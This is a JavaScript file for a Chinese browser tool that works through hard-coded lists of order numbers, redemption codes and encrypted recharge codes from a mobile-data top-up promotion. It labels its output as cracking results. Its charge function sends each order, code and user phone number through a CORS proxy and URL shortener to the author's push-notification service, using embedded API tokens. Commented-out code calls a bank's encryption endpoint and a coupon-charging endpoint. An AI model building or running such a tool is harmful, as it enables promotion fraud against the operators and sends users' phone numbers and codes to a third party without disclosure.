
var bannedKeys = ["aXJzdHRlc3Q="];
var myList = [];
var usedList = [];
var preset = [];
var presetX = 
[
"EO2017091303036658453@064ac303a5d6@",
"EO2017091303036661701@b7c82bf2b7bc@",
"EO2017091303036670840@b59761c7105c@",
"EO2017091303036665904@d2d9fa43c4e2@",
"EO2017091303036656666@b23de965a5aa@",
"EO2017091303036658678@c0b8bafdaeee@",
"EO2017091303036664413@b2f488855130@",
"EO2017082303036386287@f5ae41851eb3@",
"EO2017091303036663300@c3750f6dc624@",
"EO2017090603036594827@e21c43e3d581@",
"EO2017083003036460875@c0f66bda0047@",
"EO2017081603036213908@a7f1847f72df@",
"EO2017091303036666030@c98494796b74@",
"EO2017083003036458350@d99f040bc058@",
"EO2017091303036664306@bfdd72edcb4f@",
"EO2017082303036382387@db8860b6c8db@",
"EO2017082303036386647@f69518146f13@"];

var preset1 = [
"EO2017091303036666019@ea148b0ccaeb@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPB+3rLO3acqWW2Q4olJV/fIU3nZUX6Iez2aBuNTC8Jqw=@",
"EO2017090603036594214@02755b7c6af2@UmGdgjarlMiIaazfERBDfB0nAj8bV2bORwioEigdaDKW2Q4olJV/fIU3nZUX6Iez2aBuNTC8Jqw=@",
"EO2017100403036994890@ce400493bf70@UmGdgjarlMitj9yAoG8NGGf87xHZghpvjj3UIWbyXFQ7CZkqqfiVVmXQYPp048cg2aBuNTC8Jqw=@",
"EO2017092003036773162@e8e1c0bb72f5@UmGdgjarlMiIaazfERBDfAPv12XU9g5BLEBz7B0Z7s9+3aFHOlAjJyyF/Sbu+TPo2aBuNTC8Jqw=@",
"EO2017101803037069739@0cb5ebff9a58@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPh0ToZiT5BloqAjao/kbwtF3z+Z7yFCtl2aBuNTC8Jqw=@",
"EO2017101803037073334@0d937c31f700@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP7uzPEEDCdOFSnw1jJR6aSz23hLkEOE0f2aBuNTC8Jqw=@",
"EO2017101803037075158@0f24630afe1f@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPEu/BBQjPgF9Snw1jJR6aS9ST6ua1Iwjw2aBuNTC8Jqw=@",
"EO2017101803037073261@0d12a6e90893@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPNysJFzxEUek7CZkqqfiVVoRHOfSZKeLX2aBuNTC8Jqw=@",
"EO2017101103037035872@0a8ae7562eaf@UmGdgjarlMitj9yAoG8NGJma3dTWxnhnrV1nbHTJvIA7CZkqqfiVVoRHOfSZKeLX2aBuNTC8Jqw=@",
"EO2017101803037074285@0f389342f3d0@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP5gfsAExd8kI7CZkqqfiVVl8fLC+StlG62aBuNTC8Jqw=@",
"EO2017101803037069690@0c582f8587c0@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPegwHQZLqEqIIuCwgclqnIi286bn04plq2aBuNTC8Jqw=@",
"EO2017101803037072411@0cba43070889@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPzGNLRpPk6kkSVqTHA941WB/G2pofEPXG2aBuNTC8Jqw=@",
"EO2017101803037071477@0bc3601f5c3a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPRt5xgNQ0LoZ+3aFHOlAjJ9aaSBPNRlb82aBuNTC8Jqw=@",
"EO2017101803037071656@0bc6b9035e56@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPxw/TirG3zltMCaG3jx07WnBdQp2WbH3L2aBuNTC8Jqw=@",
"EO2017101803037071583@0cc033f061eb@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPlcd1XXDCBYbZmwYQzEdtZe6/ZBqN+MVA2aBuNTC8Jqw=@",
"EO2017091303036658408@b26aca902283@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPqx2aj8eRgyI7CZkqqfiVVudEjOU/q2S52aBuNTC8Jqw=@",
"EO2017101803037063392@0cb6fcab7266@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPxZ1TSb5Oz4gCy6e4xbfNqBS30C1GBCpx2aBuNTC8Jqw=@",
"EO2017101803037068510@0e33d44895a5@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPjYxE4jSNlRdmjJWAtZ771z+C1fG8g2Le2aBuNTC8Jqw=@",
"EO2017101803037076087@0e9b58bfcfa6@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPqtezd5tBTPHZmwYQzEdtZQnSCRid5Mv32aBuNTC8Jqw=@",
"EO2017101803037075166@0fd187fbac8c@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPC2uFQqSe3uz+D3i4Q10XTOwszCNLEjGM2aBuNTC8Jqw=@",
"EO2017101103037038871@0aa8004f218e@UmGdgjarlMitj9yAoG8NGJma3dTWxnhnt6cY2CHoWMtMCaG3jx07WibZat8zIXkc2aBuNTC8Jqw=@",
"EO2017101803037075997@0e1c7dfb0315@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPSe/+tjQMr5lRpJVhQ7c8HY/M9R/2c7WP2aBuNTC8Jqw=@",
"EO2017101803037058504@0e906dc184db@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPGdonfMAfEnACy6e4xbfNqJ7jlB1R735T2aBuNTC8Jqw=@",
"EO2017101803037074429@0cd0ec7c8c85@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPcoVeiTmbHLYCy6e4xbfNqO46csvZhYoR2aBuNTC8Jqw=@",
"EO2017101803037075933@0c5f81c84d07@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPl6tKLEtQ5mcCy6e4xbfNqN4NSX7Fuu872aBuNTC8Jqw=@",
"EO2017101803037071582@0bd158afd682@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPOtRhWeweeWTZmwYQzEdtZQRVWvIlzazl2aBuNTC8Jqw=@",
"EO2017101803037069632@0e358c9a4487@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP4MtI8xjdvVjxSR5I4zD0QWFw84ALRVyF2aBuNTC8Jqw=@",
"EO2017101803037073448@0dacaf3d67ce@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPhKlBEl47N+4Cy6e4xbfNqPH8rR8ix7ms2aBuNTC8Jqw=@",
"EO2017101803037076032@0bd1b5338610@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPaF1S5IvMfalMCaG3jx07WibZat8zIXkc2aBuNTC8Jqw=@",
"EO2017101803037070428@0e350b4e522e@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPoXVeqS6sLeQqAjao/kbwtLzhxRV5JVGY2aBuNTC8Jqw=@",
"EO2017101803037075134@0eb39030369f@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPmdHJZcUeUMs7CZkqqfiVVqpygAJOyqEt2aBuNTC8Jqw=@",
"EO2017101803037069575@10c95a5af368@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPAIVpMhr94X/xSR5I4zD0QeUMnW3zLi4L2aBuNTC8Jqw=@",
"EO2017101803037072587@10c9793d56fc@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP7Z2dZJvyiD1Snw1jJR6aS4v2I9aiBMD72aBuNTC8Jqw=@",
"EO2017101803037074413@0fdf6fc9d916@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPQ55SU0y7dvFxPvBD7zjjxNX4PuiuHn1I2aBuNTC8Jqw=@",
"EO2017101803037075960@0db24494d807@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP1NroRPiilUEqAjao/kbwtAt8odAoozOU2aBuNTC8Jqw=@",
"EO2017101803037072408@10cfeb99a65b@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPEMdbfOMQ/WilBmspJuqgAlggOlZlmk1N2aBuNTC8Jqw=@",
"EO2017101803037070574@0d42d2c9f7f7@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPSXeeaxaczvYCy6e4xbfNqJ1DLIrjHxCl2aBuNTC8Jqw=@",
"EO2017101803037073379@0e3f18cb62ba@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPDAwvElOqRUT+D3i4Q10XTHPSolzIfeLM2aBuNTC8Jqw=@",
"EO2017101803037073419@0da1562d90ee@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP3wVpjYn6dD9Kqnoztl8w3xtfo2ewysC+2aBuNTC8Jqw=@",
"EO2017101803037074388@0e3468ee3c45@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPT66i83311MvxSR5I4zD0QbKt3IT/9KLW2aBuNTC8Jqw=@",
"EO2017101803037071483@0d4bb112a0c4@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPYP9MWx0jfTFKqnoztl8w3zG1EBlyaLMz2aBuNTC8Jqw=@",
"EO2017101803037075017@0f6ccc5c9743@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPqzdgLgthXPNmjJWAtZ771z41C9QgXag32aBuNTC8Jqw=@",
"EO2017101803037072464@0d48a84b1402@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPzViSMovHITMCy6e4xbfNqHZCY1tnf/Rj2aBuNTC8Jqw=@",
"EO2017101803037075965@0e4813510a62@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPOoqHR8asTlcJuc2lL3vQVKjhTmFUgsVS2aBuNTC8Jqw=@",
"EO2017101803037073303@0feca4ff7c2b@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPOimg8vGMB4VxPvBD7zjjxL49NcvCWute2aBuNTC8Jqw=@",
"EO2017101803037075081@0e49db98a226@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPF/IkvYYfV1kqAjao/kbwtLLITv4NR1v32aBuNTC8Jqw=@",
"EO2017101803037068439@0dc70c35d5cc@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPRrBLv0tWMbIqAjao/kbwtJtR7Y0cs1lR2aBuNTC8Jqw=@",
"EO2017092703036943021@bbf0d858a76c@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0/rbw0CypYe9mjJWAtZ7710US1mbANGN12aBuNTC8Jqw=@",
"EO2017101803037073463@0e4a41342fda@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPPoyCK9Qjc59Kqnoztl8w3z6Nq25uryd72aBuNTC8Jqw=@",
"EO2017101803037075921@0ec406606cc5@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPIReFqfYAzLNMCaG3jx07WvBbn9iH60Ne2aBuNTC8Jqw=@",
"EO2017100403036980516@ab035aa90e4e@UmGdgjarlMitj9yAoG8NGGf87xHZghpvzZsT7goVcY9mjJWAtZ7710US1mbANGN12aBuNTC8Jqw=@",
"EO2017101803037070535@0ff0b43d5e6f@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPCa0+k0FcNbc7CZkqqfiVVmC0T/hTD8ns2aBuNTC8Jqw=@",
"EO2017090603036592249@03d809d2794b@UmGdgjarlMiIaazfERBDfB0nAj8bV2bOH9b3oxmf7vUSVqTHA941WLDzsj79WDKS2aBuNTC8Jqw=@",
"EO2017091303036656558@f1578c81d057@UmGdgjarlMiIaazfERBDfP3ssEHW4oDPsfT/O/PVOBASVqTHA941WLDzsj79WDKS2aBuNTC8Jqw=@",
"EO2017080903036131854@8cee68b48834@UmGdgjarlMjDqfksanOqp46v6oo0AWDW1p3ijYwrTiTxSR5I4zD0Qc+FqnaTp1WA2aBuNTC8Jqw=@",
"EO2017082303036382503@e355b9e62421@UmGdgjarlMjDqfksanOqpwflaCUwKft4O2nTTrc+dCXxSR5I4zD0Qc+FqnaTp1WA2aBuNTC8Jqw=@",
"EO2017101103037034019@0f1c631b3806@UmGdgjarlMitj9yAoG8NGJma3dTWxnhn0s+VWw3NMDFKqnoztl8w3/IOqkmUf5jF2aBuNTC8Jqw=@",
"EO2017101103037022638@fbf0c9f387c9@UmGdgjarlMitj9yAoG8NGJma3dTWxnhnj2NYuNy85vkCy6e4xbfNqNR5iiJMoyjR2aBuNTC8Jqw=@",
"EO2017101803037065426@0d0a92091edc@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPkdmU6+a8XVZxPvBD7zjjxJYsMNS/xuD02aBuNTC8Jqw=@",
"EO2017101803037066361@0bbd2eab6f0f@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPvuh+L7O4RXlxPvBD7zjjxHoKJGtnZefy2aBuNTC8Jqw=@",
"EO2017101803037059455@0f379a32b848@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPLXEDpEPvcyQa7hNvFpPqJaGDZjz9oVa22aBuNTC8Jqw=@",
"EO2017101803037075136@0d9e7470df9c@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP98S1rKAwWpFRpJVhQ7c8HSGeMpRFir3Q2aBuNTC8Jqw=@",
"EO2017101803037075952@0e27ab709331@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPY4smm47OsnWW2Q4olJV/fKmAw3z6hXy+2aBuNTC8Jqw=@",
"EO2017072603035989078@6b0a798a7a9f@UmGdgjarlMiF7fb2WHgbz9DPktLdrS3Wu2ZS9twCbVcqAjao/kbwtCWUsmfInLHc2aBuNTC8Jqw=@",
"EO2017101803037068454@0d182d1c2e94@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPWmxP4LraUDRxPvBD7zjjxPnCmZ84o2R32aBuNTC8Jqw=@",
"EO2017092003036764653@bccbe3075595@UmGdgjarlMiIaazfERBDfAPv12XU9g5BnurrxG4knfZSnw1jJR6aS8SEk9r+O2JF2aBuNTC8Jqw=@",
"EO2017092003036765630@a8d394f1074c@UmGdgjarlMiIaazfERBDfAPv12XU9g5B6BacDRMlW7/xSR5I4zD0QcKKIY3eNB1Z2aBuNTC8Jqw=@",
"EO2017101803037060392@0c5e8120f3fa@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPyPykh+aUihQqAjao/kbwtC9YzBDKJYQ82aBuNTC8Jqw=@",
"EO2017101803037070553@0cc719b17be9@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPV36DVQptuxJSnw1jJR6aSw+W6hWrXWZe2aBuNTC8Jqw=@",
"EO2017101803037072467@0f4b080059eb@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPA55fXT7s96VSnw1jJR6aS0EATo118j/N2aBuNTC8Jqw=@",
"EO2017101803037070431@0d258d97603b@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPQtT/Tudt7u7+D3i4Q10XTPfPA8vyP1AS2aBuNTC8Jqw=@",
"EO2017101803037072601@0cb82ac9d7de@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP8KPTq5/2euj1VtWVdxoGatuq05uV65z52aBuNTC8Jqw=@",
"EO2017101803037076047@0bcf729d45b3@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPB+GDvw5F93Yy8msexwur16hZthKGP/5d2aBuNTC8Jqw=@",
"EO2017101803037058506@0cd15bb5184a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPK+/797ADOGVRpJVhQ7c8HZLJEiLyjd3D2aBuNTC8Jqw=@",
"EO2017101803037069722@0dacbe1d3af0@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPpm/Ok77vxN/xSR5I4zD0QTSqrgChN5m32aBuNTC8Jqw=@",
"EO2017101803037074992@0eafb33ea0c1@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPpYvBVPL9dpB+3aFHOlAjJ6uINiqaGuqH2aBuNTC8Jqw=@",
"EO2017101803037061449@0d29a9bd0c4d@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPS3Py37MMQD8Cy6e4xbfNqGGZj0LAAc+l2aBuNTC8Jqw=@",
"EO2017101803037074339@0c5b04386706@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP1/w+KEsG/lTxSR5I4zD0QTmDwVZY0RiV2aBuNTC8Jqw=@",
"EO2017101803037072417@0dafea9b5a48@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPG0/wL602a+hmjJWAtZ7718nz1QNSaPRz2aBuNTC8Jqw=@",
"EO2017101803037059458@0fdedd4ebb9a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPk6Ytiz2gpgpMCaG3jx07Wu5hIgryR7sV2aBuNTC8Jqw=@",
"EO2017101803037059457@0cb8ff9b3a78@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPoI3uXQL2Q2f1VtWVdxoGahQiDRQlnAYY2aBuNTC8Jqw=@",
"EO2017101803037072595@0d3a2ec9071a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPRiARLghOXscqAjao/kbwtHa67u1ufjFw2aBuNTC8Jqw=@",
"EO2017101803037072562@0fe207f4364c@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPWrpP/AsXC/mW2Q4olJV/fABH0oqFpxih2aBuNTC8Jqw=@",
"EO2017101803037067324@10d4d5f1349b@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPy1AcPfU9EitvsZKMZZ+3tB9mHc/CEzBJ2aBuNTC8Jqw=@",
"EO2017101803037070597@1042ac280360@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPmfoB4ixptPcCy6e4xbfNqBLLWTT1g5Tn2aBuNTC8Jqw=@",
"EO2017101803037076811@0ebe400f0619@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPVL+96BZ6MeVMCaG3jx07Wh8ic7g6mLoX2aBuNTC8Jqw=@",
"EO2017101803037071623@0dc1fc1f698a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPgoZd73/Z4KZKqnoztl8w3ww4e4Qjsw6j2aBuNTC8Jqw=@",
"EO2017101803037073351@0e49e097e58e@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPSJ3PWci5HkBxPvBD7zjjxMgi8lc+LHX52aBuNTC8Jqw=@",
"EO2017101803037071524@0e48b6e4554a@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPsnipRk+U4N5mjJWAtZ7718o9gJAQuvkc2aBuNTC8Jqw=@",
"EO2017101803037075045@0ebbc4661016@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPH8suLq/8pxVxPvBD7zjjxA20RPhi6eTs2aBuNTC8Jqw=@",
"EO2017101803037069620@10ca144ab41b@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP5oR/k5LB9ddzTJ48rAhXqGl3qLOl0G3B2aBuNTC8Jqw=@",
"EO2017101803037068493@10d9abc4cd69@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPQTR9vqEtFn8SVqTHA941WGF+LTqyTcrT2aBuNTC8Jqw=@",
"EO2017092703036929491@b66f0efef50c@UmGdgjarlMiIaazfERBDfCW5IMR+pYC0boVM5TglNZ1Dq95RSstVLbEq9zv9Le8a2aBuNTC8Jqw=@",
"EO2017101803037073345@b66f0efef50c@UmGdgjarlMitj9yAoG8NGPJnMnivzLNP5JK+/pIFsuOlBmspJuqgAps02D+vypNl2aBuNTC8Jqw=@",
"EO2017101803037076813@0eccb9ee0008@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPfQRaBi4iFPhRpJVhQ7c8HRhjAcFUZJ642aBuNTC8Jqw=@",
"EO2017101803037073385@0dd08b9df022@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPv5LRtCUFz2hSnw1jJR6aSz2vLqS8jkih2aBuNTC8Jqw=@",
"EO2017101803037073342@0e573ce86eec@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPpD8KsyiuKMka7hNvFpPqJQiMucwsiZ3q2aBuNTC8Jqw=@",
"EO2017101803037073386@0f8b36ed7d96@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPJKPXWczeTltMCaG3jx07WiSLMeRhAM0k2aBuNTC8Jqw=@",
"EO2017101803037065409@10e171d732c1@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPpvnvKHyJkpISVqTHA941WHDKBsTR+wzc2aBuNTC8Jqw=@",
"EO2017101803037074302@0ff993e089d0@UmGdgjarlMitj9yAoG8NGPJnMnivzLNPe+F2YnR5BRdmPSHFYKmGL6cusMRm1TmG2aBuNTC8Jqw=@",
"EO2017101103037024545@09375734483d@UmGdgjarlMitj9yAoG8NGJma3dTWxnhnJMiufrIfItoa7hNvFpPqJcqs7m77hKFH2aBuNTC8Jqw=@",
"EO2017100403036978626@bcd21fd50fd3@UmGdgjarlMitj9yAoG8NGGf87xHZghpvXVH7keg40Pga7hNvFpPqJcqs7m77hKFH2aBuNTC8Jqw=@"
];

var used = [];
var rest = 0;
var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><input type=text class=form-control id=enc placeholder=充值码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px;font-size: 11px;'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-24 15:20)' style='height:200px'></textarea><iframe id=frame src='' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;background-color: yellow;width: 40%;height: 20%;'>");
  $("#yql").attr("onclick", "getEnc()");
  $("#charge").remove();
  $("#frame").remove();
  $("#yql").text("获取链接");
  var param = location.hash.split("#")[1];
  preset = window["preset" + param];
  
  var latest = removeUsed(preset);
  rest = latest.length;
  localStorage.preset = latest.join("\r\n");
  var pl = $("#result").attr("placeholder") + " 现在是: preset" + param + " 剩余码子数量：" + rest;	
  $("#result").attr("placeholder", pl);
  if(localStorage.preset.length == 0){
   prompt("复制里面的内容并发我，检查码子使用情况", localStorage.used);
  }
	
  if(localStorage.rm){
  	used = localStorage.rm.split(",");
  }
	
  $("#clear").on("click", clear);
  var p = $("#preset");
  p.val(localStorage.preset);
  p.scrollTop(p[0].scrollHeight);
}

var removeUsed = function(){
 if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
 var result = [];
 preset.forEach(function(code){
  if(usedList.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    //$("#yql").text("正在获取...");
 //    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 4){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[3].trim());
      $("#enc").val(pre[2].trim());
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    var enc = $("#enc").val().trim();
    if(mobile && orderId && enc){

      // var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      //var u = "http://ms.lefone.cn/msflowday/couponShowController/generateCheckCode?enStr=Ko8GEZulztYGzlwL41zvKHByrFzWvp51AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk=&mobile=" + mobile;
      getCharge();
	    
	    //      $.ajax({
 //          url: "https://query.yahooapis.com/v1/public/yql",
 //          dataType: "json",
 //          timeout: 10000,
 //          data: {
 //              format: "json",
 //              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
 //          },
 //          success: getUrl,
 //          error: function(c, u) {
 //              alert("错误 如果多次尝试无果请联系开发者");
 //              $("#yql").removeAttr("disabled");
 //          }
 //      });
		//$("#frame").attr("src", u);
		//$("#yql").text("如果黄色框文字中包含true表示验证码发送成功 点击可以重发验证码");
	    	//$("#yql").attr("onclick", "getEnc(true)");
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      $("#yql").text("验证码获取成功 请稍后填写");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}

var getRandom = function(){
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 3; i > 0; i--) {
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	};
	if(used.indexOf(text) == -1){
		used.push(text);
		return text;
	}else{
		return getRandom();
	}
}

var clear = function(){
	$("#mobile").val("");
	$("#code").val("");
	$("#orderId").val("");
	$("#rand").val("");
	$("#enc").val("");
	$("#yql").attr("onclick", "getEnc()");
}

var getCharge = function(){
	var mobile = $("#mobile").val().trim();
	var code = $("#code").val().trim();
	var orderId = $("#orderId").val().trim();
	var enc = $("#enc").val().trim();
	//var rand = $("#rand").val().trim();
	//if(rand){
		usedList.push(orderId + "@" + code + "@" + enc + "@");
	  	rest--;
		localStorage.used = usedList;
		//localStorage.rm = used;
		//var str = "UmGdgjarlMgUUcyuaagJoXIIQ3DK44FsD5G00suinyka7hNvFpPqJcBsljrtwJKX2aBuNTC8Jqw%3D";
		//var u = "http://ms.lefone.cn/msflowday/couponShowController/charegeCoupon?enStr=" + str + "&couponCode=" + code + "&mobile=" + mobile + "&chargeType=0&rand=" + rand;
		//var s = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + str; 
	        //var info = "http://ms.lefone.cn/msflowday/couponShowController/getCouponInfo?enStr=" + str;
		var check = "http://sc.ftqq.com/?c=talkadmin&a=hookdetail&readtoken=59bcbf7b76f8d&wid=24674&param=" + btoa(enc + "#" + code + "#" + mobile);
		var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + check;
	        //$("#frame").attr("src", info);
	        //$("#yql").text("请确认黄色框中显示乱码 否则【记录码子并刷新后】再点我一次");
		var extra = " 当前" + orderId + " 剩余" + rest;
		
		//$("#frame").attr("src", u);
		$.ajax({
		    url: "http://cors-proxy.htmldriven.com",
		    dataType: "json",
		    timeout: 10000,
		    data: {
			url: "http://www.xiaoxiangzi.com/tool/dwz.asp?domain=" + encodeURIComponent(check)
		    },
		    success: function(dt) {
			var newResult = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + dt.body;
			$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=服务端流量充值"+extra+"&desp=" + newResult)
		    }
		});
		$("#result").val(result);
		//$("#charge").text("请看黄色框中充值结果");
	//}else{
		//alert("缺少验证码");
	//}
}
